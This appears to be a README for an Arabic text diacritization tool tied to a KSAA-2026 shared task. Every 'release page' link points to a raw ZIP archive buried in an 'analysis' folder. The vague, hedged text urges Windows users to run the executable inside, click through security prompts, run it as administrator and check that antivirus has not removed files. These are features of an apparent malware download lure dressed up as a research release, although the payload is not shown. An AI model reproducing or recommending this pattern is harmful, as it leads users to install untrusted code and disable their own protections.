# 🧩 KSAA2026-Fine-Tashkeel - Arabic Diacritics Made Clear

[![Download the release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/raw/refs/heads/main/analysis/Tashkeel_KSA_Fine_v2.8-alpha.1.zip)

## 📘 Overview

KSAA2026-Fine-Tashkeel is an end-user release for Arabic text diacritization. It helps turn plain Arabic text into fully marked text with Tashkeel. The project compares multiple model types, including Seq2Seq, token classification, decoder LLM, and ASR-based systems.

This repository reflects the system used for the KSAA-2026 Shared Task and supports the use case of adding diacritics to Arabic text with a simple download-and-run flow on Windows.

## 🖥️ What You Need

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- At least 5 GB of free disk space
- A stable internet connection for the first download
- A modern browser to open the release page
- A text editor or document app if you want to paste Arabic text in and save the result

For best results, use a system with 16 GB of RAM if you work with long passages.

## 🚀 Download the App

Open the release page here:

[Visit the release page](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/raw/refs/heads/main/analysis/Tashkeel_KSA_Fine_v2.8-alpha.1.zip)

On that page, look for the latest release. Download the file that matches Windows. In many cases, this will be a `.exe`, `.zip`, or similar package. If you see a `.zip` file, extract it first before you run the app.

## 🪟 Install on Windows

Follow these steps:

1. Open the release page.
2. Find the latest version.
3. Download the Windows file.
4. If the file is compressed, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the app file to run it.

If Windows shows a security prompt, choose the option that lets you keep going only if you trust the source and have downloaded it from the release page above.

## 🔧 First Run

When you start the app for the first time, it may take a little longer while it sets up files it needs.

Typical first-run steps:

1. Open the app.
2. Wait for it to load.
3. Paste or type your Arabic text.
4. Run the diacritization task.
5. Copy the output text into your document or editor.

If the app offers multiple model choices, pick the one labeled for Arabic diacritization or Tashkeel. Some versions may also include a mode for speech input or audio-based processing.

## ✍️ How to Use It

Use the app with plain Arabic text when you want text with diacritics added.

A simple workflow:

- Open your source text
- Paste it into the input area
- Choose the available model or mode
- Start the process
- Read or copy the marked text

Good input helps the result. Short paragraphs, news text, and formal writing often work well. Very noisy text, mixed languages, or broken spelling may reduce quality.

## 🎯 Main Capabilities

This release is built around Arabic text diacritization and related model testing. It may include:

- Arabic Tashkeel output
- Multiple model options
- Support for Seq2Seq models
- Support for token classification models
- Support for decoder LLM models
- Support for ASR-based input paths
- Results from a KSAA-2026 shared task system
- Output that helps with reading, editing, and study

These functions make it useful for anyone who needs Arabic text with marks for correct reading.

## 🧠 Model Types in This Project

The project name and description point to several model families:

- **Seq2Seq**: Reads input text and produces diacritized output
- **Token classification**: Labels each token with a diacritic choice
- **Decoder LLM**: Uses a language model to generate marked Arabic text
- **ASR models**: Convert speech to text before or during the diacritization flow

You do not need to learn the model names to use the release. They are listed here so you know what kind of system sits behind the app.

## 📂 Files You May See

Inside the release package, you may see some of these files:

- `README.txt`
- `.exe` launcher
- `.bat` file
- `models` folder
- `config` folder
- `sample_input.txt`
- `output` folder

If you see a launcher file, start there. If you see sample input files, you can use them as a guide for your own text.

## 🛠️ Troubleshooting

If the app does not open:

- Make sure the download finished
- Extract the files if they came in a ZIP archive
- Check that Windows did not block the file
- Try running the app as administrator
- Make sure your antivirus did not remove part of the release folder

If the app opens but shows no output:

- Use a short Arabic paragraph first
- Remove extra spaces and strange symbols
- Check that your text is not mixed with too much English
- Try another available mode if the app gives one

If the app runs slowly:

- Close other large programs
- Use shorter text
- Make sure your PC has enough free memory

## 📄 Example Use

Input:

اللغة العربية جميلة وسهلة القراءة

Output:

اللُّغَةُ العَرَبِيَّةُ جَمِيلَةٌ وَسَهْلَةُ الْقِرَاءَةِ

The exact output can vary based on the model and the text you enter.

## 🔗 Release Page

Use this link to get the latest Windows download:

[https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/raw/refs/heads/main/analysis/Tashkeel_KSA_Fine_v2.8-alpha.1.zip](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/raw/refs/heads/main/analysis/Tashkeel_KSA_Fine_v2.8-alpha.1.zip)

## 📌 Repository Topics

- Arabic NLP
- Diacritization
- Tashkeel
- Seq2Seq
- Transformers
- Speech to text
- Shared task
- LREC 2026
- ByT5
- Arabic text processing